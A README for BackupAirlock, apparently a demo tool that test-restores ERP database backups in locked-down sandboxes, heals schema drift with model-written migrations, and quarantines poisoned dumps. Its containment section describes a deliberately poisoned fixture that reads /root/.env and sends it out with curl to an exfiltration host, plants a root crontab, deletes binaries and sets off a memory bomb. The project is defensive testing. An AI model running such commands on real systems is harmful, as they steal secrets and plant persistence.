# BackupAirlock

**BackupAirlock is an autonomous disaster-recovery verifier that restores database backups against multiple application codebase versions inside sealed, throwaway sandboxes, proving business-logic integrity, auto-generating bridge migrations for version drift, and quarantining poisoned dumps before they ever touch production.**

(Repo and service name: `restorer`. Team spec: `BACKUPAIRLOCK-SPEC.md`.)

The demo ERP is Nordvik Handel AB, a small Swedish trading company (SEK, 25 %
VAT, 200 customers, ~2,000 invoices, double-entry journal, stock), on Odoo's
table names: `res_partner`, `product_product`, `account_account`,
`account_move`, `account_move_line`, `sale_order`, `sale_order_line`,
`stock_location`, `stock_move`, `stock_quant`. Odoo-compatible in names and
accounting model, cut down to the columns the books need; SQLite with amounts
in integer öre so debits and credits compare exactly. A real Odoo backup is a
Postgres dump and needs a Postgres sandbox image; the drill is the same.

Live demo: https://vps.taild101c7.ts.net:10000/restorer/

## The Backup x App Version Compatibility Matrix (headline run)

Rows: `v1_legacy.sql` (night before the ERP upgrade, schema v1), `v2_current.sql` (last night, schema v2), `poisoned_dump.sql` (last night's dump with three attacks spliced in), plus an optional uploaded `.sql` (raw POST to `/api/uploads`, 25 MB cap). Columns: **ERP app v1.0** and **v2.0** (`apps/erp_v1`, `apps/erp_v2`): real small apps with a data layer (stdlib HTTP + SQLite), v2.0 reading the upgraded Odoo fields.

Every cell is its own sandbox: restore the dump into an empty database, boot that app version on it, run `apps/suite.py`, the deterministic business-logic suite, over loopback:
1. **API health**: `GET /api/dashboard` returns 200 from the booted app.
2. **User login (hash check)**: the bookkeeper logs in through the app (pbkdf2-sha512 in `res_users`), a wrong password is refused.
3. **Ledger + invoice math**: debits = credits; every invoice's lines + VAT = its total, as the app reads them.
4. **FK integrity**: `PRAGMA foreign_key_check` is empty.

The database comes back and the control plane re-checks the books itself (the suite ran next to an untrusted dump): the full manifest where one exists (both cells on app v2.0: reference migration in `fixtures/build.py`), else books balance + orphans.

States: **GREEN native** / **RED drift** (`v1_legacy.sql` on v2.0: `no such column: move_type`) → **YELLOW healing**: Vultr Serverless Inference reads backup schema vs app schema + the failing tests and writes `bridge_v1_to_v2.sql`; a new sandbox loads the dump into its own schema, applies the bridge, boots the app, reruns the suite; failures (sandbox error or failed tests/checks) go back for a repair, up to 3 rounds → **GREEN healed**, bridge downloadable. Drift is healed both ways (`bridge_v2_to_v1.sql` for a rollback). A dump that shares under half the app's tables is "not this app's database", no model call.

**Containment moment**: `poisoned_dump.sql` runs, through the sqlite3 CLI, `.shell cat /root/.env; curl ... --data-binary @/root/.env https://exfil...`, then writes `/etc/crontabs/root` and deletes `/usr/bin/sqlite3`, then a recursive CTE memory bomb. Live badges from the sandbox's output and cgroup: NETWORK AIR-GAP ENFORCED (0 bytes exfiltrated), READ-ONLY ROOTFS PROTECTED, MEMORY/TIMEOUT CAP HIT (512 MB / 20 s) · CONTAINER DESTROYED; the honey file is a decoy planted in the image, no real secret is in any sandbox. Verdict **QUARANTINED: DO NOT RESTORE TO PROD**; forensic incident log (`/api/runs/<id>/incident.json`: static scan with line numbers, per-sandbox containment events, stderr, exit, destroyed).

**DR Readiness Certificate** (`proof.json` / `proof.html` of a matrix run): per backup its SHA-256, status (DR READY / QUARANTINED / NOT RESTORABLE), passing app versions native or via which bridge (+ bridge sha256), every suite and control-plane result, restored database sha256, sandbox receipts, model calls; the certificate is itself hashed.

Sandbox flags (all runs): `--network none --read-only --cap-drop ALL --security-opt no-new-privileges --memory 512m --memory-swap 512m --cpus 1 --pids-limit 64`, tmpfs `/work` 64 MB, uid nobody, 20 s wall clock for matrix cells. Runtime: hardened Docker (gVisor `runsc` was not installable here: the release download URLs return 404).

## How a single drill runs

1. The backup is fingerprinted (sha256) and mounted read-only.
2. Vultr Serverless Inference (`glm-5.3`, fallback `deepseek-v4.1-flash-1017`) writes a plan and a restore script from the backup's catalog.
3. A fresh container runs it: `--network none`, 1 CPU, 256 MB, 128 pids, read-only root, tmpfs workdir, all capabilities dropped, uid nobody, wall-clock timeout. It is removed afterwards and the removal is checked.
4. On failure, stderr goes back to the model, which repairs the script (diff shown); a new sandbox runs it. Up to 3 attempts.
5. Deterministic checks, no model. The books: debits = credits per journal entry and overall; every invoice's total = its lines + 25 % VAT (per line) = its receivable line; each customer's receivable account = their open invoices; stock on hand per product = the sum of its stock moves; no orphan rows. The manifest recorded at backup time (kept in the control plane, never in the backup): row counts, sampled row hashes, a sha256 over every table, schema incl. `user_version`, one ERP smoke query. The proof states them in SEK ("debits 32,851,413.75 SEK = credits", "Customer 79 receivable: 72,203.75 SEK matches").
6. The model explains the evidence; the verdict itself comes only from steps 3 to 5.

**Backup chain** (fixture 4): every nightly backup is restored natively into the current ERP in parallel sandboxes; for nights on an older schema the model reads old vs current schema and writes one `migrate.sql`; the nights are restored into their own schema and migrated, one sandbox each, in parallel; every round runs all checks per night against a manifest built by a reference migration in `fixtures/build.py`. A sandbox error or a failed check goes back to the model for a repair, up to 3 rounds. The restore scripts are the ERP's own; only the migration is generated.

Fixtures (`fixtures/build.py`, a seeded day-by-day simulation of the company's year, so night k is the same history cut at that day): **recoverable** (catalog points to a stale path, first attempt fails, repair succeeds), **corrupted** (restores cleanly, but the export stopped inside `account_move_line` mid-invoice: books off by 3,390.00 SEK, 603 invoices and 128 customer ledgers wrong), **compromised** (post-restore hook calls out to the network, then spins: network denied, CPU at cap, killed at 3 s), **drift** (10 nightly data-only backups across an Odoo-style upgrade after night 9, modelled on real Odoo changes: `account_move.type` to `move_type` and `invoice_payment_state` to `payment_state` (Odoo 14), `stock_move.quantity_done` to `quantity` plus a new `picked` flag (Odoo 17). Nights 1-9 fail natively with "table stock_move has 11 columns but 10 values were supplied" and are migrated v1 to v2; night 10 restores natively. A migration that forgets `picked` exits 0 and is rejected by the stock_move digest, then repaired. Weekend nights hold identical data: nobody books on Saturdays).

## Files

| File | What |
|---|---|
| `app.py` | FastAPI control plane: matrix and drill pipelines, uploads, LLM calls, SSE events, certificate / bridge / incident downloads |
| `apps/erp_v1/`, `apps/erp_v2/` | the two ERP app versions booted in the sandbox (`erp.py`; `schema.sql` generated by `fixtures/build.py`) |
| `apps/suite.py` | the business-logic suite run against the booted app |
| `sandbox.py` | hardened Docker runner, live CPU/memory from the container cgroup |
| `verify.py` | the deterministic checks: five on the books, five against the manifest |
| `static/index.html` | the single-page UI (relative paths, works under any prefix) |
| `fixtures/build.py` | simulates the ERP, builds the matrix dumps + the four drill fixtures + their manifests, incl. the reference v1 to v2 migration |
| `sandbox.Dockerfile` | sandbox image `restorer-sandbox:2` (alpine + sqlite, python3, curl, honey `/root/.env`) |
| `install.sh` | one-command install on a Vultr VM |
| `shoot.js` | headless end-to-end run of all fixtures with screenshots into `shots/` |

## Deploy on a Vultr VM

1. Create a Cloud Compute VM, Ubuntu 24.04, 2 vCPU / 4 GB is plenty. Open port 80 in its Vultr firewall group (if one is attached).
2. Copy this directory to the VM, e.g. `scp -r restorer root@<vm-ip>:/root/` (or `git clone` it).
3. On the VM, as root:
   ```sh
   cd /root/restorer
   VULTR_INFERENCE_KEY='<your key>' sh install.sh
   ```
   It installs Docker and Python, builds the sandbox image and fixtures, writes the key to `/etc/restorer.env` (mode 600), and starts `restorer.service` on port 80 (`RESTORER_PORT=8530 sh install.sh` for another port).
4. Open `http://<vm-ip>/`. Health: `http://<vm-ip>/health`.

Env vars: `VULTR_INFERENCE_KEY` (required), `RESTORER_HOST` (default 127.0.0.1; install.sh sets 0.0.0.0), `RESTORER_PORT` (default 8530), `RESTORER_DOCKER` (default `docker`), `RESTORER_IMAGE` (default `restorer-sandbox:1`).

## Runtime API

RestoreGuard (`projects/restoreguard`, next to this repo, imports its LLM helpers) is the always-on runtime: it watches the ERP's
backups and proves each one on every app version. JSON only; paths are relative (base = wherever it is served, here
`http://127.0.0.1:8600`). Shapes are stable; fields are only ever added.

| Method + path | Returns |
|---|---|
| `GET /health` | `{ok, backups, queued, app_versions: ["1.0.0", ...]}` |
| `GET /api/backups` | list, newest first: `{id, file, status, reason, created_at, schema_version, app_version, bytes, found_at, started_at, finished_at, elapsed_s, checks_passed, checks_total, cells: {<app_version>: {state, reason, elapsed_s}}}` |
| `GET /api/backups/{id}` | the list fields plus `manifest` (as the backup job wrote it), `cells: {<app_version>: cell}`, `logs: {<app_version>: [event]}`, `certificate` |
| `GET /api/backups/{id}/certificate.json` | DR Readiness Certificate (same format as BackupAirlock's matrix proof, `proof_sha256` seals it); 409 until finished |
| `GET /api/backups/{id}/bridges/{name}` | a bridge migration's SQL (text/plain) |
| `POST /api/backups/{id}/rerun` | `{queued: id}`; 409 while queued/running |
| `GET /api/matrix` | `{app_versions: [...], backups: [{id, schema_version, status, cells: [{app_version, state, reason}]}]}` (cells in `app_versions` order) |
| `GET /api/stream` | SSE, one JSON event per `data:` line (below) |

`status` of a backup: `queued`, `running`, `dr_ready` (restorable on at least one app version), `not_restorable`, `quarantined`,
`failed` (unreadable manifest; never ran). `state` of a cell: `running`, `native` (restored, app runs on it as is, including the
app's own forward migrations), `healed` (a GLM bridge migration made it run, checks pass), `failed`, `quarantined` (containment
signal or static-scan finding), `not_run`.

A cell: `{cell: "<backup>@<app_version>", backup, app_version, state, reason, checks: [{check, pass, detail}], timings: {<step>: s},
signals: ["network"|"rootfs"|"honey"|"memory"|"timeout"], static_scan: [{line, text, why}], bridges: [{name, round, sha256, sql,
changes, failure?}], llm_calls: [{purpose, model, latency_s, tokens, fallback}], elapsed_s}`.

Events (SSE and `logs`), all with `cell, backup, app_version, t` (s since the cell started) except `backup`:
`{type: "check", check, pass, detail}`, `{type: "sandbox", phase: "started"|"destroyed"|"NOT DESTROYED", name, policy?}`,
`{type: "log", stream, line}`, `{type: "policy", signal, event, detail}`, `{type: "llm", phase: "start"|"done"|"error", purpose,
model, ...}`, `{type: "bridge", round, name, changes}`, `{type: "verdict", state, reason}`, and per backup
`{type: "backup", id, status, reason}`.

## Limits (honest)

- Sandbox is hardened Docker, not a microVM: the build host has no KVM. On a VM with nested virtualisation, swap `sandbox.py`'s `docker run` for Microsandbox/Firecracker; nothing else changes.
- The control plane talks to the Docker daemon, which is root-equivalent; it is never exposed to the sandbox.
- One drill at a time (409 otherwise); a chain drill runs up to 10 sandboxes at once, a matrix 6-8. No auth, by design for the demo.
- In the matrix a cell that trips any containment signal (or a dump with CLI commands found by the static scan) is quarantined; so is an honest dump that needs more than 512 MB or 20 s, by design at these caps.
- The business-logic suite runs inside the sandbox next to the restored, untrusted data; that is why the control plane re-checks the books on the returned database. Not built: the spec's optional plain-English rule to assertion.
- The chain builds one migration per run and refuses a chain whose old nights span more than one old schema.
